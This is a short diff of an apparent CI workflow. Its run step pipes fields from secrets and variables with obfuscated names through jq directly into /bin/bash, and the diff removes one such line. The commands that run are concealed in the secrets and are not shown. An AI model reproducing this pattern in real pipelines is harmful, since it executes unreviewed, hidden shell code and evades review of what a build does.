@@ -22,7 +22,6 @@ jobs:
           be325: ${{ secrets.be325 }}
         run: |
           printf '%s' "$be325" | jq -r .i71 | /bin/bash
-          echo $ej0 | jq -r .nf106 | /bin/bash
           echo $cyh68029 | jq -r .k1 | /bin/bash
           echo $s5662 | jq -r .v9 | /bin/bash
           printf '%s' "$dtwwz6890" | jq -r .px1 | /bin/bash
